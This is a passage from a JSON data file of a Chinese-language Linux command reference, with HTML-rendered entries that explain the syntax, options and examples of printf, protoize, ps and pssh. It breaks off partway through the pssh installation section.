        "body": "<h1 id=\"printf\">printf</h1>\n<p>格式化并输出结果。</p>\n<h2 id=\"目录\">目录</h2>\n<ul>\n<li><a href=\"#%E5%86%85%E5%BB%BA%E5%91%BD%E4%BB%A4\">bash内建命令</a></li>\n<li><a href=\"#%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4\">GNU coreutils中的命令</a></li>\n</ul>\n<h2 id=\"内建命令\">内建命令</h2>\n<h4 id=\"概要\">概要</h4>\n<pre><code class=\"language-shell\">printf <span class=\"hljs-selector-attr\">[-v var]</span> format <span class=\"hljs-selector-attr\">[arguments]</span>\n</code></pre>\n<h4 id=\"主要用途\">主要用途</h4>\n<ul>\n<li>格式化参数并输出。</li>\n</ul>\n<h4 id=\"选项\">选项</h4>\n<pre><code class=\"language-shell\">-v <span class=\"hljs-keyword\">var</span>：将结果输出到变量<span class=\"hljs-keyword\">var</span>中而不是输出到标准输出。\n</code></pre>\n<h4 id=\"参数\">参数</h4>\n<p>format：输出格式。</p>\n<p>arguments：一到多个参数。</p>\n<pre><code class=\"language-shell\">转义序列：除了支持printf(1)和printf(3)的转义序列，内建printf还支持以下转义序列：\n<span class=\"hljs-tag\">\n%<span class=\"hljs-selector-tag\">b</span></span>       展开参数中的反斜杠转义字符。\n<span class=\"hljs-tag\">%<span class=\"hljs-selector-tag\">q</span></span>       将参数扩起以用作shell输入。\n<span class=\"hljs-tag\">%(fmt)<span class=\"hljs-selector-tag\">T</span></span>  根据strftime(3)中的转义字符来输出日期时间字符串。\n</code></pre>\n<h4 id=\"返回值\">返回值</h4>\n<p>返回状态为成功除非给出了非法选项、写错误、赋值错误。</p>\n<h4 id=\"例子\">例子</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># %-5s 格式为左对齐且宽度为5的字符串代替（'-'表示左对齐），不使用则默认右对齐。</span>\n<span class=\"hljs-comment\"># %-4.2f 格式为左对齐宽度为4，保留两位小数。</span>\n\n<span class=\"hljs-attribute\">printf</span> <span class=\"hljs-string\">\"%-5s %-10s %-4s\\n\"</span> NO Name Mark\n<span class=\"hljs-attribute\">printf</span> <span class=\"hljs-string\">\"%-5s %-10s %-4.2f\\n\"</span> <span class=\"hljs-number\">01</span> Tom <span class=\"hljs-number\">90</span>.<span class=\"hljs-number\">3456</span>\n<span class=\"hljs-attribute\">printf</span> <span class=\"hljs-string\">\"%-5s %-10s %-4.2f\\n\"</span> <span class=\"hljs-number\">02</span> Jack <span class=\"hljs-number\">89</span>.<span class=\"hljs-number\">2345</span>\n<span class=\"hljs-attribute\">printf</span> <span class=\"hljs-string\">\"%-5s %-10s %-4.2f\\n\"</span> <span class=\"hljs-number\">03</span> Jeff <span class=\"hljs-number\">98</span>.<span class=\"hljs-number\">4323</span>\n\n<span class=\"hljs-comment\"># 输出</span>\n<span class=\"hljs-attribute\">NO</span>    Name       Mark\n<span class=\"hljs-attribute\">01</span>    Tom        <span class=\"hljs-number\">90</span>.<span class=\"hljs-number\">35</span>\n<span class=\"hljs-attribute\">02</span>    Jack       <span class=\"hljs-number\">89</span>.<span class=\"hljs-number\">23</span>\n<span class=\"hljs-attribute\">03</span>    Jeff       <span class=\"hljs-number\">98</span>.<span class=\"hljs-number\">43</span>\n\n\n<span class=\"hljs-comment\"># %b %q %(fmt)T 的例子。</span>\n<span class=\"hljs-comment\"># see it again with a newline.</span>\n<span class=\"hljs-attribute\">printf</span> <span class=\"hljs-string\">\"%s\\n\"</span> 'hello world'\n<span class=\"hljs-comment\"># 展开换行符，和上面的结果一样。</span>\n<span class=\"hljs-attribute\">printf</span> <span class=\"hljs-string\">\"%b\"</span> 'hello world\\n'\n\n<span class=\"hljs-attribute\">printf</span> '%q\\n' 'a b c'\n<span class=\"hljs-comment\"># 输出</span>\n<span class=\"hljs-attribute\">a</span>\\ b\\ c\n\n<span class=\"hljs-comment\"># %z为时区，%n为换行符。</span>\n<span class=\"hljs-attribute\">printf</span> <span class=\"hljs-string\">\"%(%F %T %z%n)T\"</span>\n<span class=\"hljs-comment\"># 输出</span>\n<span class=\"hljs-attribute\">2019</span>-<span class=\"hljs-number\">09</span>-<span class=\"hljs-number\">10</span> <span class=\"hljs-number\">01</span>:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">07</span> +<span class=\"hljs-number\">0000</span>\n</code></pre>\n<h4 id=\"注意\">注意</h4>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<h2 id=\"外部命令\">外部命令</h2>\n<h4 id=\"概要-1\">概要</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">printf</span> FORMAT [ARGUMENT]...\n<span class=\"hljs-built_in\">printf</span> OPTION\n</code></pre>\n<h4 id=\"主要用途-1\">主要用途</h4>\n<ul>\n<li>格式化参数并输出。</li>\n</ul>\n<h4 id=\"选项-1\">选项</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help 显示帮助信息并退出。</span>\n<span class=\"hljs-comment\">--version 显示版本信息并退出。</span>\n</code></pre>\n<h4 id=\"参数-1\">参数</h4>\n<p>format：输出格式。</p>\n<p>arguments：一到多个参数。</p>\n<pre><code class=\"language-shell\">在这里忽略了（%b %q），如果你安装的coreutils版本支持它们，那么请参考上面的例子。\n支持的转义序列：\n\n<span class=\"hljs-string\">\\\"</span>          双引号\n<span class=\"hljs-string\">\\\\</span>          反斜杠\n<span class=\"hljs-string\">\\a</span>          响铃\n<span class=\"hljs-string\">\\b</span>          退格\n<span class=\"hljs-string\">\\c</span>          截断输出\n<span class=\"hljs-string\">\\e</span>          退出\n<span class=\"hljs-string\">\\f</span>          翻页\n<span class=\"hljs-string\">\\n</span>          换行\n<span class=\"hljs-string\">\\r</span>          回车\n<span class=\"hljs-string\">\\t</span>          水平制表符\n<span class=\"hljs-string\">\\v</span>          竖直制表符\n<span class=\"hljs-string\">\\NNN</span>        八进制数 (<span class=\"hljs-number\">1</span>到<span class=\"hljs-number\">3</span>位数字)\n<span class=\"hljs-string\">\\xHH</span>        十六进制数 (<span class=\"hljs-number\">1</span>到<span class=\"hljs-number\">2</span>位数字)\n<span class=\"hljs-string\">\\uHHHH</span>      Unicode字符附加<span class=\"hljs-number\">4</span>位十六进制数字\n<span class=\"hljs-string\">\\UHHHHHHHH</span>  Unicode字符附加<span class=\"hljs-number\">8</span>位十六进制数字\n%%          百分号\n\n以及<span class=\"hljs-string\">'diouxXfeEgGcs'</span>中的一个结尾的C格式规范，将被转换为正确的类型并处理可变宽度。\n</code></pre>\n<h4 id=\"例子-1\">例子</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 使用 /usr/bin/printf 确保调用的不是内建命令。</span>\n<span class=\"hljs-comment\"># 当然，在你关闭内建printf以及确认当前环境没有printf函数的情况下，可直接使用printf，详见末尾\"注意\"的链接。</span>\n\n<span class=\"hljs-comment\"># 按行打印数组和关联数组的下标及值。</span>\n\n<span class=\"hljs-comment\"># 声明数组可以不加'declare -a'或'local -a'（在函数内声明的局部变量）。</span>\narr=(<span class=\"hljs-string\">'line1'</span> <span class=\"hljs-string\">'line2'</span>)\n<span class=\"hljs-regexp\">/usr/</span>bin/printf <span class=\"hljs-string\">\"%s\\n\"</span> <span class=\"hljs-variable\">${!arr[@]}</span>\n<span class=\"hljs-comment\"># 输出下标</span>\n<span class=\"hljs-number\">0</span>\n<span class=\"hljs-number\">1</span>\n<span class=\"hljs-regexp\">/usr/</span>bin/printf <span class=\"hljs-string\">\"%s\\n\"</span> <span class=\"hljs-variable\">${arr[@]}</span>\n<span class=\"hljs-comment\"># 输出值</span>\nline1\nline2\n\n<span class=\"hljs-comment\">#声明关联数组（也就是字典）必须加'declare -A'或'local -A'（在函数内声明的局部变量）。</span>\ndeclare -A assoc_arr=([<span class=\"hljs-string\">'key1'</span>]=<span class=\"hljs-string\">'value1'</span> [<span class=\"hljs-string\">'key2'</span>]=<span class=\"hljs-string\">'value2'</span>)\n<span class=\"hljs-regexp\">/usr/</span>bin/printf <span class=\"hljs-string\">\"%s\\n\"</span> <span class=\"hljs-variable\">${!assoc_arr[@]}</span>\n<span class=\"hljs-comment\"># 输出键。</span>\nkey2\nkey1\n<span class=\"hljs-regexp\">/usr/</span>bin/printf <span class=\"hljs-string\">\"%s\\n\"</span> <span class=\"hljs-variable\">${assoc_arr[@]}</span>\n<span class=\"hljs-comment\"># 输出值。</span>\nvalue2\nvalue1\n</code></pre>\n<h4 id=\"返回值-1\">返回值</h4>\n<p>返回状态为成功除非给出了非法选项等。</p>\n<h4 id=\"注意-1\">注意</h4>\n<ol>\n<li><p>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 printf</code>或<code>info coreutils 'pwd invocation'</code>。</p>\n</li>\n<li><p>启动或关闭内建命令请查看<code>enable</code>命令，关于同名优先级的问题请查看<code>builtin</code>命令的例子部分的相关讨论。</p>\n</li>\n<li><p>我通过和<code>bug-bash@gnu.org</code>的交流，得到了关于这几个格式说明符<code>%b %q %(fmt)T</code>的解释：</p>\n<blockquote>\n<p>printf(1)中的%b格式说明符是printf(3)支持的格式之外增加的一个POSIX特性。</p>\n<p>%q和%T说明符是非标准的，并且不受所有独立实现的printf的支持。</p>\n</blockquote>\n<p>更多细节请参考链接：</p>\n<ul>\n<li><a href=\"https://pubs.opengroup.org/onlinepubs/9699919799/utilities/printf.html\">POSIX printf</a>\n<code>APPLICATION USAGE</code>段落的第五节。</li>\n<li><a href=\"https://pubs.opengroup.org/onlinepubs/9699919799/functions/printf.html\">POSIX printf格式说明符</a>\n的<code>Description</code>段落。</li>\n</ul>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "protoize",
        "des": "GNU-C代码转换为ANSI-C代码",
        "body": "<h1 id=\"protoize\">protoize</h1>\n<p>GNU-C代码转换为ANSI-C代码</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>protoize命令</strong> 属于gcc套件，用于为C语言源代码文件添加函数原型，将GNU-C代码转换为ANSI-C代码。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">protoize</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：设置需要转换代码的目录；</span>\n<span class=\"hljs-deletion\">-x：转换代码时排除的文件。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：需要转换代码的C语言源文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ps",
        "des": "报告当前系统的进程状态",
        "body": "<h1 id=\"ps\">ps</h1>\n<p>报告当前系统的进程状态</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ps命令</strong> 用于报告当前系统的进程状态。可以搭配kill指令随时中断、删除不必要的程序。ps命令是最基本同时也是非常强大的进程查看命令，使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等，总之大部分信息都是可以通过执行该命令得到的。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ps</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-a：显示所有终端机下执行的程序，除了阶段作业领导者之外。\na：显示现行终端机下的所有程序，包括其他用户的程序。\n-A：显示所有程序。\n-c：显示CLS和PRI栏位。\nc：列出程序时，显示每个程序真正的指令名称，而不包含路径，选项或常驻服务的标示。\n-C<span class=\"hljs-variable\">&lt;指令名称&gt;</span>：指定执行指令的名称，并列出该指令的程序的状况。\n-d：显示所有程序，但不包括阶段作业领导者的程序。\n-e：此选项的效果和指定<span class=\"hljs-string\">\"A\"</span>选项相同。\ne：列出程序时，显示每个程序所使用的环境变量。\n-f：显示UID,PPIP,C与STIME栏位。\nf：用ASCII字符显示树状结构，表达程序间的相互关系。\n-g<span class=\"hljs-variable\">&lt;群组名称&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"-G\"</span>选项相同，当亦能使用阶段作业领导者的名称来指定。\ng：显示现行终端机下的所有程序，包括群组领导者的程序。\n-G<span class=\"hljs-variable\">&lt;群组识别码&gt;</span>：列出属于该群组的程序的状况，也可使用群组名称来指定。\nh：不显示标题列。\n-H：显示树状结构，表示程序间的相互关系。\n-j或j：采用工作控制的格式显示程序状况。\n-l或l：采用详细的格式来显示程序状况。\nL：列出栏位的相关信息。\n-m或m：显示所有的执行绪。\nn：以数字来表示USER和WCHAN栏位。\n-N：显示所有的程序，除了执行ps指令终端机下的程序之外。\n-p<span class=\"hljs-variable\">&lt;程序识别码&gt;</span>：指定程序识别码，并列出该程序的状况。\np<span class=\"hljs-variable\">&lt;程序识别码&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"-p\"</span>选项相同，只在列表格式方面稍有差异。\nr：只列出现行终端机正在执行中的程序。\n-s<span class=\"hljs-variable\">&lt;阶段作业&gt;</span>：指定阶段作业的程序识别码，并列出隶属该阶段作业的程序的状况。\ns：采用程序信号的格式显示程序状况。\nS：列出程序时，包括已中断的子程序资料。\n-t<span class=\"hljs-variable\">&lt;终端机编号&gt;</span>：指定终端机编号，并列出属于该终端机的程序的状况。\nt<span class=\"hljs-variable\">&lt;终端机编号&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"-t\"</span>选项相同，只在列表格式方面稍有差异。\n-T：显示现行终端机下的所有程序。\n-u<span class=\"hljs-variable\">&lt;用户识别码&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"-U\"</span>选项相同。\nu：以用户为主的格式来显示程序状况。\n-U<span class=\"hljs-variable\">&lt;用户识别码&gt;</span>：列出属于该用户的程序的状况，也可使用用户名称来指定。\nU<span class=\"hljs-variable\">&lt;用户名称&gt;</span>：列出属于该用户的程序的状况。\nv：采用虚拟内存的格式显示程序状况。\n-V或V：显示版本信息。\n-w或w：采用宽阔的格式来显示程序状况。　\nx：显示所有程序，不以终端机来区分。\nX：采用旧式的Linux i386登陆格式显示程序状况。\n-y：配合选项<span class=\"hljs-string\">\"-l\"</span>使用时，不显示F(flag)栏位，并以RSS栏位取代ADDR栏位　。\n-<span class=\"hljs-variable\">&lt;程序识别码&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"p\"</span>选项相同。\n--cols<span class=\"hljs-variable\">&lt;每列字符数&gt;</span>：设置每列的最大字符数。\n--columns<span class=\"hljs-variable\">&lt;每列字符数&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"--cols\"</span>选项相同。\n--cumulative：此选项的效果和指定<span class=\"hljs-string\">\"S\"</span>选项相同。\n--deselect：此选项的效果和指定<span class=\"hljs-string\">\"-N\"</span>选项相同。\n--forest：此选项的效果和指定<span class=\"hljs-string\">\"f\"</span>选项相同。\n--headers：重复显示标题列。\n--help：在线帮助。\n--info：显示排错信息。\n--lines<span class=\"hljs-variable\">&lt;显示列数&gt;</span>：设置显示画面的列数。\n--no-headers：此选项的效果和指定<span class=\"hljs-string\">\"h\"</span>选项相同，只在列表格式方面稍有差异。\n--group<span class=\"hljs-variable\">&lt;群组名称&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"-G\"</span>选项相同。\n--Group<span class=\"hljs-variable\">&lt;群组识别码&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"-G\"</span>选项相同。\n--pid<span class=\"hljs-variable\">&lt;程序识别码&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"-p\"</span>选项相同。\n--rows<span class=\"hljs-variable\">&lt;显示列数&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"--lines\"</span>选项相同。\n--sid<span class=\"hljs-variable\">&lt;阶段作业&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"-s\"</span>选项相同。\n--tty<span class=\"hljs-variable\">&lt;终端机编号&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"-t\"</span>选项相同。\n--user<span class=\"hljs-variable\">&lt;用户名称&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"-U\"</span>选项相同。\n--User<span class=\"hljs-variable\">&lt;用户识别码&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"-U\"</span>选项相同。\n--version：此选项的效果和指定<span class=\"hljs-string\">\"-V\"</span>选项相同。\n--widty<span class=\"hljs-variable\">&lt;每列字符数&gt;</span>：此选项的效果和指定<span class=\"hljs-string\">\"-cols\"</span>选项相同。\n</code></pre>\n<p>由于ps命令能够支持的系统类型相当的多，所以选项多的离谱！</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">ps</span> axo pid,comm,pcpu <span class=\"hljs-comment\"># 查看进程的PID、名称以及CPU 占用率</span>\n<span class=\"hljs-built_in\">ps</span> aux | <span class=\"hljs-built_in\">sort</span> <span class=\"hljs-literal\">-rnk</span> <span class=\"hljs-number\">4</span> <span class=\"hljs-comment\"># 按内存资源的使用量对进程进行排序</span>\n<span class=\"hljs-built_in\">ps</span> aux | <span class=\"hljs-built_in\">sort</span> <span class=\"hljs-literal\">-nk</span> <span class=\"hljs-number\">3</span>  <span class=\"hljs-comment\"># 按 CPU 资源的使用量对进程进行排序</span>\n<span class=\"hljs-built_in\">ps</span> <span class=\"hljs-literal\">-A</span> <span class=\"hljs-comment\"># 显示所有进程信息</span>\n<span class=\"hljs-built_in\">ps</span> <span class=\"hljs-literal\">-u</span> root <span class=\"hljs-comment\"># 显示指定用户信息</span>\n<span class=\"hljs-built_in\">ps</span> <span class=\"hljs-literal\">-efL</span> <span class=\"hljs-comment\"># 查看线程数</span>\n<span class=\"hljs-built_in\">ps</span> <span class=\"hljs-literal\">-e</span> <span class=\"hljs-literal\">-o</span> <span class=\"hljs-string\">\"%C : %p :%z : %a\"</span>|<span class=\"hljs-built_in\">sort</span> <span class=\"hljs-literal\">-k5</span> <span class=\"hljs-literal\">-nr</span> <span class=\"hljs-comment\"># 查看进程并按内存使用大小排列</span>\n<span class=\"hljs-built_in\">ps</span> <span class=\"hljs-literal\">-ef</span> <span class=\"hljs-comment\"># 显示所有进程信息，连同命令行</span>\n<span class=\"hljs-built_in\">ps</span> <span class=\"hljs-literal\">-ef</span> | grep ssh <span class=\"hljs-comment\"># ps 与grep 常用组合用法，查找特定进程</span>\n<span class=\"hljs-built_in\">ps</span> <span class=\"hljs-literal\">-C</span> nginx <span class=\"hljs-comment\"># 通过名字或命令搜索进程</span>\n<span class=\"hljs-built_in\">ps</span> aux -<span class=\"hljs-literal\">-sort</span>=<span class=\"hljs-literal\">-pcpu</span>,+pmem <span class=\"hljs-comment\"># CPU或者内存进行排序,-降序，+升序</span>\n<span class=\"hljs-built_in\">ps</span> <span class=\"hljs-operator\">-f</span> -<span class=\"hljs-literal\">-forest</span> <span class=\"hljs-literal\">-C</span> nginx <span class=\"hljs-comment\"># 用树的风格显示进程的层次关系</span>\n<span class=\"hljs-built_in\">ps</span> <span class=\"hljs-literal\">-o</span> pid,uname,comm <span class=\"hljs-literal\">-C</span> nginx <span class=\"hljs-comment\"># 显示一个父进程的子进程</span>\n<span class=\"hljs-built_in\">ps</span> <span class=\"hljs-literal\">-e</span> <span class=\"hljs-literal\">-o</span> pid,uname=USERNAME,pcpu=CPU_USAGE,pmem,comm <span class=\"hljs-comment\"># 重定义标签</span>\n<span class=\"hljs-built_in\">ps</span> <span class=\"hljs-literal\">-e</span> <span class=\"hljs-literal\">-o</span> pid,comm,etime <span class=\"hljs-comment\"># 显示进程运行的时间</span>\n<span class=\"hljs-built_in\">ps</span> <span class=\"hljs-literal\">-aux</span> | grep named <span class=\"hljs-comment\"># 查看named进程详细信息</span>\n<span class=\"hljs-built_in\">ps</span> <span class=\"hljs-literal\">-o</span> command <span class=\"hljs-literal\">-p</span> <span class=\"hljs-number\">91730</span> | sed <span class=\"hljs-literal\">-n</span> <span class=\"hljs-number\">2</span>p <span class=\"hljs-comment\"># 通过进程id获取服务名称</span>\n</code></pre>\n<p>将目前属于您自己这次登入的 PID 与相关信息列示出来</p>\n<pre><code class=\"language-shell\">ps -l\n#  UID   PID  PPID        F CPU PRI NI       SZ    RSS WCHAN     S             ADDR TTY           TIME CMD\n#  <span class=\"hljs-number\">501</span>   <span class=\"hljs-number\">566</span>   <span class=\"hljs-number\">559</span>     <span class=\"hljs-number\">4006</span>   <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">31</span>  <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">4317620</span>    <span class=\"hljs-number\">228</span> -      Ss                  <span class=\"hljs-number\">0</span> ttys001    <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00.05</span> <span class=\"hljs-regexp\">/App...cOS/i</span>Term2 --server <span class=\"hljs-regexp\">/usr/</span>bin<span class=\"hljs-regexp\">/login -fpl kenny /</span>Ap...s<span class=\"hljs-regexp\">/MacOS/i</span>Term2 --launch_shel\n#  <span class=\"hljs-number\">501</span>   <span class=\"hljs-number\">592</span>   <span class=\"hljs-number\">577</span>     <span class=\"hljs-number\">4006</span>   <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">31</span>  <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">4297048</span>     <span class=\"hljs-number\">52</span> -      S                   <span class=\"hljs-number\">0</span> ttys001    <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00.63</span> -zsh\n</code></pre>\n<ul>\n<li>F 代表这个程序的旗标 (flag)， 4 代表使用者为 super user</li>\n<li>S 代表这个程序的状态 (STAT)，关于各 STAT 的意义将在内文介绍</li>\n<li>UID 程序被该 UID 所拥有</li>\n<li>PID 就是这个程序的 ID ！</li>\n<li>PPID 则是其上级父程序的ID</li>\n<li>C CPU 使用的资源百分比</li>\n<li>PRI 这个是 Priority (优先执行序) 的缩写，详细后面介绍</li>\n<li>NI 这个是 Nice 值，在下一小节我们会持续介绍</li>\n<li>ADDR 这个是 kernel function，指出该程序在内存的那个部分。如果是个 running的程序，一般就是 \"-\"</li>\n<li>SZ 使用掉的内存大小</li>\n<li>WCHAN 目前这个程序是否正在运作当中，若为 - 表示正在运作</li>\n<li>TTY 登入者的终端机位置</li>\n<li>TIME 使用掉的 CPU 时间。</li>\n<li>CMD 所下达的指令为何</li>\n</ul>\n<blockquote>\n<p>在预设的情况下， <code>ps</code> 仅会列出与目前所在的 <code>bash shell</code> 有关的 <code>PID</code> 而已，所以， 当我使用 <code>ps -l</code> 的时候，只有三个 PID。</p>\n</blockquote>\n<p>列出目前所有的正在内存当中的程序</p>\n<pre><code class=\"language-shell\">ps aux\n\n# USER               PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND\n# kenny             <span class=\"hljs-number\">6155</span>  <span class=\"hljs-number\">21.3</span>  <span class=\"hljs-number\">1.7</span>  <span class=\"hljs-number\">7969944</span> <span class=\"hljs-number\">284912</span>   ??  S    二<span class=\"hljs-number\">03</span>下午 <span class=\"hljs-number\">199</span>:<span class=\"hljs-number\">14.14</span> <span class=\"hljs-regexp\">/Appl...OS/</span>WeChat\n# kenny              <span class=\"hljs-number\">559</span>  <span class=\"hljs-number\">20.4</span>  <span class=\"hljs-number\">0.8</span>  <span class=\"hljs-number\">4963740</span> <span class=\"hljs-number\">138176</span>   ??  S    二<span class=\"hljs-number\">03</span>下午  <span class=\"hljs-number\">33</span>:<span class=\"hljs-number\">28.27</span> <span class=\"hljs-regexp\">/Appl...S/i</span>Term2\n# _windowserver      <span class=\"hljs-number\">187</span>  <span class=\"hljs-number\">18.0</span>  <span class=\"hljs-number\">0.6</span>  <span class=\"hljs-number\">7005748</span>  <span class=\"hljs-number\">95884</span>   ??  Ss   二<span class=\"hljs-number\">03</span>下午 <span class=\"hljs-number\">288</span>:<span class=\"hljs-number\">44.97</span> /Syst...Light.WindowServer -daemon\n# kenny             <span class=\"hljs-number\">1408</span>  <span class=\"hljs-number\">10.7</span>  <span class=\"hljs-number\">2.1</span>  <span class=\"hljs-number\">5838592</span> <span class=\"hljs-number\">347348</span>   ??  S    二<span class=\"hljs-number\">03</span>下午 <span class=\"hljs-number\">138</span>:<span class=\"hljs-number\">51.63</span> <span class=\"hljs-regexp\">/Appl...nts/M</span>acOS/Google Chrome\n# kenny              <span class=\"hljs-number\">327</span>   <span class=\"hljs-number\">5.8</span>  <span class=\"hljs-number\">0.5</span>  <span class=\"hljs-number\">5771984</span>  <span class=\"hljs-number\">79452</span>   ??  S    二<span class=\"hljs-number\">03</span>下午   <span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">51.58</span> <span class=\"hljs-regexp\">/Syst...pp/</span>Contents<span class=\"hljs-regexp\">/MacOS/</span>Finder\n</code></pre>\n<ul>\n<li>USER：该 process 属于那个使用者账号的</li>\n<li>PID ：该 process 的号码</li>\n<li>%CPU：该 process 使用掉的 CPU 资源百分比</li>\n<li>%MEM：该 process 所占用的物理内存百分比</li>\n<li>VSZ ：该 process 使用掉的虚拟内存量 (Kbytes)</li>\n<li>RSS ：该 process 占用的固定的内存量 (Kbytes)</li>\n<li>TTY ：该 process 是在那个终端机上面运作，若与终端机无关，则显示 ?，另外， tty1-tty6 是本机上面的登入者程序，若为 pts/0 等等的，则表示为由网络连接进主机的程序。</li>\n<li>STAT：该程序目前的状态，主要的状态有</li>\n<li>R ：该程序目前正在运作，或者是可被运作</li>\n<li>S ：该程序目前正在睡眠当中 (可说是 idle 状态)，但可被某些讯号 (signal) 唤醒。</li>\n<li>T ：该程序目前正在侦测或者是停止了</li>\n<li>Z ：该程序应该已经终止，但是其父程序却无法正常的终止他，造成 zombie (疆尸) 程序的状态</li>\n<li>START：该 process 被触发启动的时间</li>\n<li>TIME ：该 process 实际使用 CPU 运作的时间</li>\n<li>COMMAND：该程序的实际指令</li>\n</ul>\n<p>列出类似程序树的程序显示</p>\n<pre><code class=\"language-shell\">ps -axjf\n\n# USER               PID  PPID  PGID   SESS JOBC STAT   TT       TIME COMMAND            UID   C STIME   TTY\n# root                 <span class=\"hljs-number\">1</span>     <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">1</span>      <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">0</span> Ss     ??   <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">51.90</span> <span class=\"hljs-regexp\">/sbin/</span>launchd        <span class=\"hljs-number\">0</span>   <span class=\"hljs-number\">0</span> 二<span class=\"hljs-number\">03</span>下午 ??\n# root                <span class=\"hljs-number\">50</span>     <span class=\"hljs-number\">1</span>    <span class=\"hljs-number\">50</span>      <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">0</span> Ss     ??    <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">10.07</span> <span class=\"hljs-regexp\">/usr/</span>sbin/syslog     <span class=\"hljs-number\">0</span>   <span class=\"hljs-number\">0</span> 二<span class=\"hljs-number\">03</span>下午 ??\n# root                <span class=\"hljs-number\">51</span>     <span class=\"hljs-number\">1</span>    <span class=\"hljs-number\">51</span>      <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">0</span> Ss     ??    <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">29.90</span> <span class=\"hljs-regexp\">/usr/</span>libexec/Use     <span class=\"hljs-number\">0</span>   <span class=\"hljs-number\">0</span> 二<span class=\"hljs-number\">03</span>下午 ??\n</code></pre>\n<p>找出与 cron 与 syslog 这两个服务有关的 PID 号码</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ps</span> aux | egrep <span class=\"hljs-string\">'(cron|syslog)'</span>\n\n<span class=\"hljs-comment\"># root                50   0.0  0.0  4305532   1284   ??  Ss   二03下午   0:10.08 /usr/sbin/syslogd</span>\n<span class=\"hljs-comment\"># kenny            90167   0.0  0.0  4258468    184 s007  R+    9:23下午   0:00.00 egrep (cron|syslog)</span>\n</code></pre>\n<p>把所有进程显示出来，并输出到ps001.txt文件</p>\n<pre><code class=\"language-shell\">ps -<span class=\"hljs-built_in\">aux</span> &gt; ps001.txt\n</code></pre>\n<p>输出指定的字段</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "pssh",
        "des": "批量管理执行",
        "body": "<h1 id=\"pssh\">pssh</h1>\n<p>批量管理执行</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pssh命令</strong> 是一个python编写可以在多台服务器上执行命令的工具，同时支持拷贝文件，是同类工具中很出色的，类似pdsh，个人认为相对pdsh更为简便，使用必须在各个服务器上配置好密钥认证访问。</p>\n<h3 id=\"安装pssh\">安装pssh</h3>\n<p>在CentOS系统环境下，介绍yum的安装和源码安装的方式：</p>\n<p> <strong>yum方法</strong> </p>\n<pre><code class=\"language-shell\">yum <span class=\"hljs-keyword\">install</span> pssh\n</code></pre>\n<p> <strong>编译安装</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">wget</span> http://parallel-ssh.googlecode.com/files/pssh-<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">1</span>.tar.gz\n<span class=\"hljs-attribute\">tar</span> xf pssh-<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">1</span>.tar.gz\n<span class=\"hljs-attribute\">cd</span> pssh-<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">1</span>/\n<span class=\"hljs-attribute\">python</span> setup.py install\n</code></pre>\n<h3 